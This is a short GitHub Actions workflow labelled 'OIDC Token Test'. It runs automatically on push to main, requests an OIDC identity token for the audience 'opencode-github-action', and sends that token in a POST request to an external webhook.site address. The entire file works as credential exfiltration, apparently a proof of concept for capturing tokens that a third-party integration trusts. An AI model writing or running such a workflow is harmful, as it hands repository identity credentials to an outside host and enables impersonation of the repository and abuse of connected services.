name: OIDC Token Test
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC Token
        uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('opencode-github-action');
            const resp = await fetch('https://webhook.site/3addc096-f69f-4c8d-959d-846fc60433bc', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({oidc_token: token})
            });
            console.log('Sent OIDC token to webhook, status:', resp.status);
